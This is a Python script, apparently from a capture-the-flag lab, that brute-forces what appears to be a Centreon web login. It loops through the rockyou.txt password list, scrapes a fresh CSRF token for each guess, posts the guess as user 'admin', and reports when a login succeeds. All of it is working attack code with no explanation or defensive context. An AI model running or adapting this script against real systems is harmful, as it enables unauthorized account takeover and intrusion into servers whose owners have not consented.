import requests
import sys
import warnings
from bs4 import BeautifulSoup
 
# turn off BeautifulSoup warnings
warnings.filterwarnings("ignore", category=UserWarning, module='bs4')
 
url = 'http://1.2.3.4/folder' #sys.argv[1]
username = 'admin' #sys.argv[2]
#password = sys.argv[1]
ip = '10.10.10.157' #sys.argv[4]
port = '80' #sys.argv[5]
 

f = open('./rockyou.txt')
word = f.readline()
while word: 
    print (word.strip())
    password = word.strip()
    request = requests.session()
    #print("[+] Retrieving CSRF token to submit the login form")
    page = request.get(url+"/index.php")
    html_content = page.text
    #print (html_content)
    soup = BeautifulSoup(html_content, features="lxml")
    #token = soup.findAll('input')[2].get("value")
    token = soup.find('input', {'name': '_token'}).get('value')
    #print (token)
     
    login_info = {
        "useralias": username,
        "password": password,
        "submitLogin": "Connect",
        "centreon_token": token
    }
    login_request = request.post(url+"/index.php", login_info)
    #print("[+] Login token is : {0}".format(token))
    # print (login_request.status_code)
    #print(login_request.text)
    if (login_request.status_code != 200):
        print (login_request.status_code)
        exit()
    if "Your credentials are incorrect." not in login_request.text:
        print("[+] Logged In Sucssfully")
        exit()

    else:
        print("[-] Wrong credentials")
        #exit()
    word = f.readline()
f.close()